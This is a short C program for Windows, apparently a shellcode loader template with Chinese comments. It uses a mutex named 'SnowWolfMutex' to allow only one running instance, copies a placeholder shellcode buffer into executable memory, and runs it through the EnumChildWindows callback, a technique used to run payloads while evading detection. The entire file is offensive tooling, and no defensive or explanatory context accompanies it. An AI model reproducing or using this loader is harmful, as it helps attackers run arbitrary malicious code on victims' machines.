#include <windows.h>

unsigned char shellcode[] =
"[Shellcode]";

int main(int argc, char* argv[]) {
  HANDLE hMutex;
  //创建互斥体
  hMutex = CreateMutexA(NULL, FALSE, "SnowWolfMutex ");
  if (GetLastError() == ERROR_ALREADY_EXISTS) {
    if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
      CloseHandle(hMutex);
      return 0;
    }
  }

  //运行Shellcode
  LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, shellcode, sizeof(shellcode));
  EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

  if (hMutex)
    CloseHandle(hMutex);
  return 0;
}
